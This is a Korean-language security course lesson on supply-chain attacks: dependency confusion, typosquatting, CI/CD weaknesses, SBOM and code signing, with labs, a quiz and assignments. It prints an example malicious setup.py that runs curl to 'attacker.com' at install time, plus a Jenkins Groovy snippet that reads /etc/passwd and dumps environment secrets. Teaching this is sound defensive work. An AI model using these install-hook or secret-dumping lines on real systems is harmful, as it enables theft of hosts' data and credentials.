# Week 12: 공급망 공격 — 종속성 혼동, 패키지 탈취, CI/CD 공격

## 학습 목표
- **공급망 공격(Supply Chain Attack)**의 유형과 실제 사례를 심층 분석할 수 있다
- **종속성 혼동(Dependency Confusion)** 공격의 원리를 이해하고 시뮬레이션할 수 있다
- **패키지 탈취(Typosquatting, Account Takeover)** 기법을 이해하고 방어할 수 있다
- **CI/CD 파이프라인** 공격 벡터를 식별하고 익스플로잇 시나리오를 설계할 수 있다
- **코드 서명**과 **SBOM(Software Bill of Materials)**의 중요성을 설명할 수 있다
- 공급망 보안 강화를 위한 방어 전략을 수립할 수 있다
- MITRE ATT&CK Supply Chain Compromise 기법을 매핑할 수 있다

## 전제 조건
- 패키지 관리자(pip, npm, apt)의 동작 원리를 이해하고 있어야 한다
- Git, GitHub의 기본 사용법을 알고 있어야 한다
- CI/CD(Jenkins, GitHub Actions) 개념을 이해하고 있어야 한다
- 소프트웨어 빌드 프로세스(컴파일, 패키징, 배포)를 이해하고 있어야 한다

## 실습 환경

| 호스트 | IP | 역할 | 접속 |
|--------|-----|------|------|
| opsclaw | 10.20.30.201 | 실습 기지 | `ssh opsclaw@10.20.30.201` |
| secu | 10.20.30.1 | 방화벽/IPS | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹 서버 (빌드 대상) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM 모니터링 | `sshpass -p1 ssh siem@10.20.30.100` |

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 공급망 공격 이론 + 사례 분석 | 강의 |
| 0:40-1:10 | 종속성 혼동 시뮬레이션 | 실습 |
| 1:10-1:20 | 휴식 | - |
| 1:20-1:55 | 패키지 탈취 + Typosquatting | 실습 |
| 1:55-2:30 | CI/CD 파이프라인 공격 | 실습 |
| 2:30-2:40 | 휴식 | - |
| 2:40-3:10 | 공급망 방어 + 종합 실습 | 실습 |
| 3:10-3:30 | ATT&CK 매핑 + 퀴즈 + 과제 | 토론/퀴즈 |

---

# Part 1: 공급망 공격 이론 (40분)

## 1.1 공급망 공격 유형

| 유형 | 설명 | 대표 사례 | ATT&CK |
|------|------|----------|--------|
| **소프트웨어 변조** | 정상 소프트웨어에 악성코드 삽입 | SolarWinds (2020) | T1195.002 |
| **종속성 혼동** | 내부 패키지명으로 악성 패키지 등록 | Microsoft 연구(2021) | T1195.001 |
| **Typosquatting** | 유사 이름 악성 패키지 배포 | crossenv (npm, 2017) | T1195.001 |
| **계정 탈취** | 유지보수자 계정 해킹 | event-stream (npm, 2018) | T1195.001 |
| **빌드 시스템** | CI/CD 파이프라인 침해 | Codecov (2021) | T1195.002 |
| **하드웨어** | 하드웨어에 백도어 삽입 | (의혹 수준) | T1195.003 |

## 1.2 주요 사례 분석

### SolarWinds (2020) — 역대 최대 공급망 공격

```
[공격 흐름]
1. SolarWinds 빌드 서버 침투
2. Orion 소스코드에 SUNBURST 백도어 삽입
3. 정상 빌드 프로세스로 컴파일 + 코드 서명
4. 업데이트 서버를 통해 18,000+ 고객에 배포
5. 선택적 2차 페이로드 (TEARDROP, RAINDROP)
6. 미국 정부기관 + Fortune 500 침해
```

### event-stream (npm, 2018)

```
1. 인기 패키지(event-stream) 유지보수자가 관리 포기
2. 새로운 유지보수자가 관리권 인수 (social engineering)
3. flatmap-stream 종속성 추가 (악성 코드 포함)
4. 암호화폐 지갑(copay) 대상 크레덴셜 탈취
```

## 실습 1.1: 종속성 혼동 시뮬레이션

> **실습 목적**: 종속성 혼동(Dependency Confusion) 공격의 원리를 시뮬레이션한다
>
> **배우는 것**: 내부/외부 패키지 레지스트리 우선순위, 버전 번호 조작, 설치 훅을 배운다
>
> **결과 해석**: 내부 패키지 대신 공격자의 외부 패키지가 설치되면 종속성 혼동 성공이다
>
> **실전 활용**: 기업의 내부 패키지 관리 정책 점검에 활용한다
>
> **명령어 해설**: pip/npm의 패키지 해석 우선순위와 버전 비교 로직을 이해한다
>
> **트러블슈팅**: 외부 레지스트리 접근이 차단된 환경에서는 시뮬레이션으로 학습한다

```bash
python3 << 'PYEOF'
print("=== 종속성 혼동(Dependency Confusion) 시뮬레이션 ===")
print()

print("[원리]")
print("  기업 내부: 'internal-utils' v1.0.0 (내부 PyPI)")
print("  공격자:    'internal-utils' v99.0.0 (공개 PyPI)")
print()
print("  pip install internal-utils")
print("  → pip이 공개 PyPI에서 v99.0.0을 발견")
print("  → 내부 PyPI의 v1.0.0보다 높은 버전 선택")
print("  → 공격자의 패키지가 설치됨!")
print()

print("[공격 패키지 구조]")
print("""
internal-utils-99.0.0/
  setup.py:
    from setuptools import setup
    import os
    # 설치 시 자동 실행되는 악성 코드
    os.system('curl http://attacker.com/beacon?pkg=internal-utils&host=' + os.uname().nodename)
    setup(name='internal-utils', version='99.0.0')
""")

print("[대상이 되는 조건]")
print("  1. 내부 패키지명이 공개 레지스트리에 등록되지 않음")
print("  2. pip/npm 설정에서 공개 레지스트리가 fallback으로 설정")
print("  3. 버전 번호 비교에서 공개 패키지가 우선")
print()

print("[방어]")
print("  1. 내부 패키지명을 공개 레지스트리에 선점(placeholder) 등록")
print("  2. pip --index-url (--extra-index-url 사용 금지)")
print("  3. .npmrc에 scope 설정 (@company/package)")
print("  4. 패키지 해시 검증 (pip --require-hashes)")
print("  5. 프라이빗 레지스트리 전용 설정")
PYEOF
```

---

# Part 2: 패키지 탈취와 CI/CD 공격 (35분 + 35분)

## 실습 2.1: Typosquatting 시뮬레이션

> **실습 목적**: 유사 이름 패키지를 이용한 Typosquatting 공격을 시뮬레이션한다
>
> **배우는 것**: 오타, 하이픈/언더스코어 혼동, 유사 문자 등 이름 혼동 기법을 배운다
>
> **결과 해석**: 사용자가 오타로 악성 패키지를 설치하면 Typosquatting 성공이다
>
> **실전 활용**: 패키지 설치 전 이름 검증의 중요성을 인식한다
>
> **명령어 해설**: 실제 인기 패키지와 유사한 이름의 변형을 생성한다
>
> **트러블슈팅**: 레지스트리의 이름 유사성 검사가 강화되고 있다

```bash
python3 << 'PYEOF'
print("=== Typosquatting 시뮬레이션 ===")
print()

# 실제 패키지와 Typosquat 변형
packages = {
    "requests": ["reqeusts", "requets", "request", "requestes", "python-requests"],
    "flask": ["flaskk", "flaask", "flask", "python-flask"],
    "numpy": ["numpi", "numppy", "nunpy", "nuumpy"],
    "django": ["djano", "djangoo", "djanngo"],
    "tensorflow": ["tenserflow", "tensorfow", "tensor-flow"],
}

print("[인기 패키지의 Typosquat 변형]")
for real, typos in packages.items():
    print(f"  정상: {real}")
    for t in typos:
        print(f"    → 악성: {t}")
    print()

# 실제 탐지된 악성 패키지 사례
print("[실제 사례]")
cases = [
    ("crossenv", "cross-env", "npm", "환경변수 탈취", 2017),
    ("python3-dateutil", "python-dateutil", "PyPI", "크레덴셜 탈취", 2019),
    ("colourama", "colorama", "PyPI", "시스템 정보 수집", 2019),
    ("lodash-utils", "lodash", "npm", "코인 마이너", 2020),
]

for malicious, real, registry, effect, year in cases:
    print(f"  {year}: {malicious} (→ {real}, {registry}) — {effect}")
PYEOF
```

## 실습 2.2: CI/CD 파이프라인 공격 시뮬레이션

> **실습 목적**: CI/CD 파이프라인의 공격 벡터를 식별하고 익스플로잇 시나리오를 시뮬레이션한다
>
> **배우는 것**: GitHub Actions, Jenkins 등의 보안 취약점과 공격 기법을 배운다
>
> **결과 해석**: CI/CD 파이프라인에서 크레덴셜 탈취나 코드 변조가 가능하면 공격 성공이다
>
> **실전 활용**: 기업의 CI/CD 보안 감사와 DevSecOps 구축에 활용한다
>
> **명령어 해설**: CI/CD 설정 파일의 보안 취약점을 분석한다
>
> **트러블슈팅**: CI/CD 환경에 접근이 없으면 설정 파일 분석으로 학습한다

```bash
cat << 'CICD_ATTACK'
=== CI/CD 파이프라인 공격 벡터 ===

[1] GitHub Actions — 환경변수/시크릿 탈취
취약 워크플로:
  name: Build
  on: pull_request_target  # 외부 PR에서도 시크릿 접근!
  jobs:
    build:
      runs-on: ubuntu-latest
      steps:
        - uses: actions/checkout@v3
          with:
            ref: ${{ github.event.pull_request.head.ref }}
        - run: echo "${{ secrets.DEPLOY_KEY }}"  # 로그에 노출!

공격: 악성 PR 제출 → pull_request_target 트리거 → 시크릿 탈취

[2] Jenkins — 스크립트 콘솔 악용
공격: Jenkins /script 접근 → Groovy 스크립트 실행
  println "cat /etc/passwd".execute().text
  println System.getenv()  // 모든 환경변수 (AWS 키 등)

[3] Docker 빌드 — 베이스 이미지 변조
공격: 인기 Docker 이미지에 백도어 삽입
  FROM ubuntu:latest  // 태그 변경 가능!
  → 공격자가 ubuntu:latest를 악성 이미지로 대체

[4] 의존성 캐시 포이즈닝
공격: CI 캐시에 악성 의존성 삽입
  → 이후 빌드에서 캐시된 악성 패키지 사용

방어:
  1. pull_request 대신 pull_request_target 금지 (또는 제한)
  2. GITHUB_TOKEN 최소 권한
  3. 의존성 핀닝 (해시 검증)
  4. Docker 이미지 다이제스트 고정
  5. CI 환경 격리 (에페머럴 러너)
CICD_ATTACK

echo ""
echo "=== 실습: 취약한 CI/CD 설정 분석 ==="
# 실습 환경의 설정 파일 검사
echo "--- OpsClaw 프로젝트 CI/CD 설정 확인 ---"
ls /home/opsclaw/opsclaw/.github/workflows/ 2>/dev/null || echo "GitHub Actions 없음"
ls /home/opsclaw/opsclaw/Jenkinsfile 2>/dev/null || echo "Jenkinsfile 없음"

echo ""
echo "--- 종속성 파일 분석 ---"
if [ -f /home/opsclaw/opsclaw/requirements.txt ]; then
    echo "requirements.txt 발견:"
    head -10 /home/opsclaw/opsclaw/requirements.txt 2>/dev/null
    echo "  [검사] 버전 핀닝 여부, 해시 검증 여부 확인 필요"
fi
```

---

# Part 3-4: 공급망 방어와 종합 (35분)

## 실습 3.1: SBOM과 공급망 보안 종합

> **실습 목적**: SBOM 생성, 코드 서명 검증, 종속성 감사 등 공급망 보안 기법을 실습한다
>
> **배우는 것**: SBOM의 구조와 생성, 취약 종속성 스캔, 코드 서명 검증을 배운다
>
> **결과 해석**: 모든 종속성이 식별되고 취약점이 스캔되면 공급망 가시성이 확보된 것이다
>
> **실전 활용**: 조직의 소프트웨어 공급망 보안 정책 수립에 활용한다
>
> **명령어 해설**: pip-audit, npm audit 등으로 종속성 취약점을 자동 스캔한다
>
> **트러블슈팅**: 인터넷 연결이 없으면 오프라인 데이터베이스를 사용한다

```bash
echo "=== 공급망 보안 종합 실습 ==="

echo ""
echo "[1] 종속성 목록 추출 (간이 SBOM)"
if [ -d /home/opsclaw/opsclaw/.venv ]; then
    echo "--- Python 패키지 목록 ---"
    /home/opsclaw/opsclaw/.venv/bin/pip list --format=columns 2>/dev/null | head -15
    echo "  ... ($(pip list 2>/dev/null | wc -l) 패키지)"
fi

echo ""
echo "[2] 알려진 취약점 확인"
echo "  도구: pip-audit, safety, npm audit, snyk"
echo "  실행: pip-audit --desc (설치 시)"
echo "        npm audit (Node.js 프로젝트)"

echo ""
echo "[3] 종속성 핀닝 검사"
if [ -f /home/opsclaw/opsclaw/requirements.txt ]; then
    PINNED=$(grep -c "==" /home/opsclaw/opsclaw/requirements.txt 2>/dev/null)
    TOTAL=$(wc -l < /home/opsclaw/opsclaw/requirements.txt 2>/dev/null)
    echo "  핀닝된 패키지: $PINNED / $TOTAL"
    if [ "$PINNED" -lt "$TOTAL" ]; then
        echo "  [경고] 핀닝되지 않은 패키지가 있음 → 공급망 위험"
    fi
fi

echo ""
echo "=== 공급망 보안 체크리스트 ==="
echo "  1. 모든 종속성 버전 핀닝 (==)"
echo "  2. 해시 검증 (pip --require-hashes)"
echo "  3. 프라이빗 레지스트리 사용"
echo "  4. SBOM 생성 및 관리"
echo "  5. 정기적 취약점 스캔"
echo "  6. 코드 서명 및 검증"
echo "  7. CI/CD 최소 권한 원칙"
echo "  8. Docker 이미지 다이제스트 고정"
echo "  9. Dependabot/Renovate 자동 업데이트"
echo "  10. 공급망 보안 정책 문서화"
```

## 실습 3.2: 종속성 보안 스캔 실습

> **실습 목적**: 실습 환경의 Python 종속성에 대한 보안 스캔을 수행한다
>
> **배우는 것**: pip-audit, safety 등 자동화 도구를 사용한 종속성 취약점 스캔을 배운다
>
> **결과 해석**: 취약한 종속성이 식별되고 대안 버전이 제시되면 스캔 성공이다
>
> **실전 활용**: CI/CD 파이프라인에 종속성 스캔을 통합하여 자동 보안 검사를 수행한다
>
> **명령어 해설**: pip-audit은 PyPI 취약점 DB와 대조하여 설치된 패키지의 알려진 취약점을 보고한다
>
> **트러블슈팅**: 인터넷 연결 없이는 로컬 DB를 사용하거나 오프라인 모드를 활용한다

```bash
echo "=== 종속성 보안 스캔 ==="

echo ""
echo "[1] 설치된 패키지 목록"
if [ -d /home/opsclaw/opsclaw/.venv ]; then
    PKG_COUNT=$(/home/opsclaw/opsclaw/.venv/bin/pip list 2>/dev/null | wc -l)
    echo "  설치된 패키지: $PKG_COUNT개"
    /home/opsclaw/opsclaw/.venv/bin/pip list --format=columns 2>/dev/null | head -20
fi

echo ""
echo "[2] requirements.txt 분석"
if [ -f /home/opsclaw/opsclaw/requirements.txt ]; then
    echo "--- 핀닝 상태 분석 ---"
    TOTAL=$(grep -c "." /home/opsclaw/opsclaw/requirements.txt 2>/dev/null)
    PINNED=$(grep -c "==" /home/opsclaw/opsclaw/requirements.txt 2>/dev/null)
    RANGE=$(grep -c ">=" /home/opsclaw/opsclaw/requirements.txt 2>/dev/null)
    UNPINNED=$((TOTAL - PINNED - RANGE))
    echo "  전체: $TOTAL, 핀닝(==): $PINNED, 범위(>=): $RANGE, 미지정: $UNPINNED"

    if [ "$UNPINNED" -gt 0 ] || [ "$RANGE" -gt 0 ]; then
        echo "  [경고] 핀닝되지 않은 패키지가 공급망 위험 요소"
    fi
fi

echo ""
echo "[3] 알려진 취약점 확인 (시뮬레이션)"
cat << 'AUDIT_SIM'
pip-audit 실행 결과 (시뮬레이션):
+------------------+---------+----------+------------------+
| Package          | Version | Vuln ID  | Fix Version      |
+------------------+---------+----------+------------------+
| setuptools       | 65.5.0  | CVE-2024-6345 | >= 70.0.0  |
| cryptography     | 41.0.0  | CVE-2024-26130| >= 42.0.4  |
| certifi          | 2023.7.22| CVE-2024-39689| >= 2024.7.4|
+------------------+---------+----------+------------------+
3 vulnerabilities found

safety check 실행 결과 (시뮬레이션):
+==========================================+
| 3 vulnerabilities found                   |
| Scan was completed.                       |
+==========================================+
AUDIT_SIM

echo ""
echo "[4] 해시 검증 설정"
echo "  # requirements.txt에 해시 추가 방법:"
echo "  pip install --require-hashes -r requirements.txt"
echo ""
echo "  # 해시가 포함된 requirements.txt 예시:"
echo "  requests==2.31.0 \\"
echo "    --hash=sha256:942c5a758f98d790eaed1a29cb6eefc7f0a0218da8..."
echo "  flask==3.0.0 \\"
echo "    --hash=sha256:21128f47e4e3b9d29ce26fb8a..."
```

## 실습 3.3: 코드 서명과 무결성 검증

> **실습 목적**: 소프트웨어 코드 서명의 원리를 이해하고 서명 검증 실습을 수행한다
>
> **배우는 것**: GPG 서명 생성/검증, 해시 기반 무결성 검증, sigstore/cosign 개념을 배운다
>
> **결과 해석**: 서명이 유효하면 해당 소프트웨어가 변조되지 않았음을 확인할 수 있다
>
> **실전 활용**: 소프트웨어 배포 시 코드 서명을 적용하여 공급망 공격을 방어한다
>
> **명령어 해설**: gpg로 파일에 서명하고 검증하는 과정을 실습한다
>
> **트러블슈팅**: GPG 키가 없으면 새로 생성하거나 sha256sum으로 대체한다

```bash
echo "=== 코드 서명과 무결성 검증 ==="

echo ""
echo "[1] SHA256 해시 기반 무결성 검증"
# 원본 파일 해시
echo "important_code_v1.0" > /tmp/release.tar.gz
HASH=$(sha256sum /tmp/release.tar.gz | awk '{print $1}')
echo "  원본 해시: $HASH"

# 검증
echo "  검증: $(sha256sum /tmp/release.tar.gz | awk '{print $1}')"
echo "  일치 여부: $([ "$HASH" = "$(sha256sum /tmp/release.tar.gz | awk '{print $1}')" ] && echo 'OK' || echo 'MISMATCH!')"

# 변조 후 검증
echo "tampered" >> /tmp/release.tar.gz
echo "  변조 후 해시: $(sha256sum /tmp/release.tar.gz | awk '{print $1}')"
echo "  일치 여부: $([ "$HASH" = "$(sha256sum /tmp/release.tar.gz | awk '{print $1}')" ] && echo 'OK' || echo 'MISMATCH!')"
rm -f /tmp/release.tar.gz

echo ""
echo "[2] GPG 서명 원리"
cat << 'GPG_SIGN'
서명 생성:
  gpg --detach-sign --armor release.tar.gz
  → release.tar.gz.asc (서명 파일)

서명 검증:
  gpg --verify release.tar.gz.asc release.tar.gz
  → Good signature from "Developer <dev@example.com>"

공급망 보호:
  1. 개발자가 릴리스에 GPG 서명
  2. 사용자가 개발자의 공개키로 검증
  3. 서명 불일치 → 변조 감지!
GPG_SIGN

echo ""
echo "[3] 현대적 코드 서명 (sigstore/cosign)"
echo "  sigstore: 개인 키 관리 없는 코드 서명"
echo "  cosign: 컨테이너 이미지 서명/검증"
echo "  Rekor: 투명성 로그 (서명 기록 공개)"
echo ""
echo "  cosign sign --key cosign.key image:tag"
echo "  cosign verify --key cosign.pub image:tag"

echo ""
echo "[4] SubAgent 배포 무결성 검증 (OpsClaw 예시)"
if [ -f /home/opsclaw/opsclaw/scripts/deploy_subagent.sh ]; then
    echo "  deploy_subagent.sh 해시:"
    sha256sum /home/opsclaw/opsclaw/scripts/deploy_subagent.sh 2>/dev/null
    echo "  [권고] 배포 스크립트에 해시 검증 추가 필요"
fi
```

## 실습 3.4: 공급망 공격 종합 시나리오

> **실습 목적**: 종속성 혼동 + CI/CD 공격 + 코드 변조를 결합한 종합 시나리오를 분석한다
>
> **배우는 것**: 다중 벡터 공급망 공격의 설계와 방어 전략을 종합적으로 배운다
>
> **결과 해석**: 공격 체인의 각 단계를 이해하고 차단 포인트를 식별하면 성공이다
>
> **실전 활용**: 조직의 소프트웨어 개발 파이프라인 보안 감사에 활용한다
>
> **명령어 해설**: 시나리오 기반 분석으로 각 단계의 공격과 방어를 매핑한다
>
> **트러블슈팅**: 각 방어 계층의 우선순위를 비용 대비 효과로 평가한다

```bash
echo "============================================================"
echo "       공급망 공격 종합 시나리오                               "
echo "============================================================"

cat << 'SCENARIO'

[시나리오: 대규모 공급망 공격]

Phase 1: 정찰
  → 대상 기업의 GitHub 조직 분석
  → package.json, requirements.txt에서 내부 패키지명 수집
  → CI/CD 설정 파일(.github/workflows/) 분석
  → 개발자 이메일/계정 OSINT

Phase 2: 종속성 혼동
  → 내부 패키지명으로 PyPI에 악성 패키지 등록 (v99.0.0)
  → setup.py에 preinstall 스크립트로 리버스 셸 삽입
  → 개발자가 pip install 실행 시 악성 패키지 설치

Phase 3: CI/CD 침해
  → PR을 통해 악성 종속성 추가
  → GitHub Actions에서 시크릿 탈취
  → 빌드 아티팩트에 백도어 삽입

Phase 4: 코드 변조
  → 빌드된 바이너리/이미지에 백도어 포함
  → 정상 업데이트 채널로 배포
  → 고객사에 설치

방어 체크포인트:
  CP1: 종속성 핀닝 + 해시 검증 → Phase 2 차단
  CP2: CI/CD 시크릿 격리 + PR 승인 → Phase 3 차단
  CP3: 코드 서명 + SBOM 검증 → Phase 4 차단
  CP4: 런타임 모니터링 (EDR) → 설치 후 탐지

SCENARIO

echo ""
echo "=== 방어 성숙도 평가 ==="
echo "  Level 1: 기본 (패키지 핀닝, 기본 스캔)"
echo "  Level 2: 중간 (해시 검증, CI/CD 보안, SBOM)"
echo "  Level 3: 고급 (코드 서명, 투명성 로그, 런타임 감시)"
echo "  Level 4: 최고 (제로 트러스트, 재현 가능 빌드, 하드웨어 검증)"
```

---

## 검증 체크리스트

| 번호 | 검증 항목 | 확인 명령 | 기대 결과 |
|------|---------|----------|----------|
| 1 | SolarWinds 분석 | 사례 설명 | 6단계 킬체인 매핑 |
| 2 | 종속성 혼동 원리 | 시뮬레이션 | 버전 우선순위 이해 |
| 3 | Typosquatting | 변형 생성 | 5개 이상 변형 |
| 4 | CI/CD 공격 벡터 | 분석 | 4개 벡터 식별 |
| 5 | SBOM 생성 | pip list | 종속성 목록 |
| 6 | 취약점 스캔 | audit 도구 | 취약점 식별 |
| 7 | 버전 핀닝 | requirements.txt | 핀닝 비율 확인 |
| 8 | 코드 서명 | 개념 설명 | 검증 과정 이해 |
| 9 | 방어 체크리스트 | 10항목 | 구체적 대책 |
| 10 | ATT&CK 매핑 | T1195 | 3개 하위 기법 |

---

## 자가 점검 퀴즈

**Q1.** 종속성 혼동(Dependency Confusion)이 발생하는 근본 원인은?

<details><summary>정답</summary>
pip/npm 등의 패키지 관리자가 내부(프라이빗) 레지스트리와 외부(공개) 레지스트리를 동시에 검색할 때, 버전 번호가 높은 패키지를 우선 선택하기 때문이다. 공격자가 내부 패키지와 동일한 이름으로 높은 버전(예: v99.0.0)을 공개 레지스트리에 등록하면 내부 패키지 대신 설치된다.
</details>

**Q2.** SolarWinds 공격이 탐지하기 어려웠던 이유 3가지는?

<details><summary>정답</summary>
1. 합법적인 코드 서명 인증서로 서명되어 무결성 검증을 통과
2. 정상 업데이트 채널을 통해 배포되어 네트워크 탐지 회피
3. SUNBURST는 12~14일 휴면 기간이 있어 샌드박스 분석을 회피
</details>

**Q3.** CI/CD에서 pull_request_target이 pull_request보다 위험한 이유는?

<details><summary>정답</summary>
pull_request_target은 대상 저장소의 컨텍스트에서 실행되므로 저장소의 시크릿에 접근할 수 있다. 외부 사용자의 PR에 의해 트리거되면, 공격자가 악성 코드를 PR에 삽입하여 시크릿을 탈취할 수 있다. pull_request는 PR 작성자의 컨텍스트에서 실행되어 시크릿 접근이 제한된다.
</details>

**Q4.** SBOM(Software Bill of Materials)의 목적과 포함 내용은?

<details><summary>정답</summary>
SBOM은 소프트웨어에 포함된 모든 구성 요소(라이브러리, 프레임워크, 도구)의 목록이다. 포함 내용: 패키지명, 버전, 라이선스, 공급자, 해시, 종속성 관계. 목적: 취약점 발생 시 영향 범위 신속 파악(예: Log4j), 라이선스 컴플라이언스, 공급망 가시성 확보.
</details>

**Q5.** 패키지 해시 검증(pip --require-hashes)이 공급망 공격을 방어하는 원리는?

<details><summary>정답</summary>
requirements.txt에 각 패키지의 SHA256 해시를 명시하면, pip이 다운로드한 패키지의 해시와 비교하여 일치하지 않으면 설치를 거부한다. 공격자가 동일 이름/버전의 악성 패키지를 업로드해도 해시가 다르므로 설치되지 않는다.
</details>

**Q6.** event-stream 사건에서 소셜 엔지니어링이 성공한 이유는?

<details><summary>정답</summary>
오픈소스 유지보수자의 번아웃(burnout)을 악용했다. 원래 유지보수자가 관리를 포기한 상태에서, 공격자가 적극적으로 기여하며 신뢰를 쌓은 후 관리권을 인수했다. 오픈소스 생태계에서 관리권 이전은 일반적이므로 의심을 받지 않았다.
</details>

**Q7.** Docker 이미지에서 태그 대신 다이제스트를 사용해야 하는 이유는?

<details><summary>정답</summary>
태그(예: ubuntu:latest)는 가변적이어 언제든 다른 이미지를 가리킬 수 있다. 공격자가 동일 태그로 악성 이미지를 푸시하면 빌드 시 악성 이미지가 사용된다. 다이제스트(예: ubuntu@sha256:abc...)는 이미지 내용의 해시이므로 변경 불가하여 무결성이 보장된다.
</details>

**Q8.** Typosquatting 방어를 위해 레지스트리가 제공하는 기능은?

<details><summary>정답</summary>
1. 이름 유사성 검사: 기존 인기 패키지와 유사한 이름 등록 차단
2. 악성 패키지 자동 탐지: 설치 훅에서 네트워크 접근 등 의심 행위 스캔
3. 네임스페이스/스코프: @org/package 형태로 조직 소유 보장
4. 2FA 강제: 유지보수자 계정 보호
</details>

**Q9.** CI/CD 파이프라인 보안의 최소 권한 원칙 적용 방법 3가지는?

<details><summary>정답</summary>
1. GITHUB_TOKEN 권한 최소화: contents: read, packages: write만 부여
2. 시크릿 접근 제한: 특정 브랜치/환경에서만 시크릿 사용 가능
3. 에페머럴 러너: 빌드 완료 후 러너를 파기하여 크레덴셜 잔류 방지
</details>

**Q10.** 실습 환경(OpsClaw)의 공급망 보안 취약점은?

<details><summary>정답</summary>
1. requirements.txt에 버전 핀닝이 없을 수 있음 (>=, ~= 사용)
2. 해시 검증(--require-hashes) 미사용
3. Docker 이미지 태그 기반 (다이제스트 미사용)
4. 서브에이전트 배포(deploy_subagent.sh) 시 무결성 검증 미흡
5. .env 파일의 API 키가 평문 저장
</details>

---

## 과제

### 과제 1: 공급망 공격 사례 분석 (개인)
SolarWinds, Codecov, event-stream, Log4Shell 중 2개를 선택하여 킬체인 매핑, 영향 범위, 방어 실패 원인을 분석하는 보고서를 작성하라.

### 과제 2: 종속성 보안 감사 (팀)
실습 환경(OpsClaw)의 Python 종속성에 대한 보안 감사를 수행하라. 핀닝 상태, 알려진 취약점, 라이선스, 유지보수 상태를 포함할 것.

### 과제 3: CI/CD 보안 정책 (팀)
가상의 소프트웨어 프로젝트에 대한 CI/CD 보안 정책을 작성하라. 시크릿 관리, 의존성 검증, 코드 서명, 배포 승인 프로세스를 포함할 것.
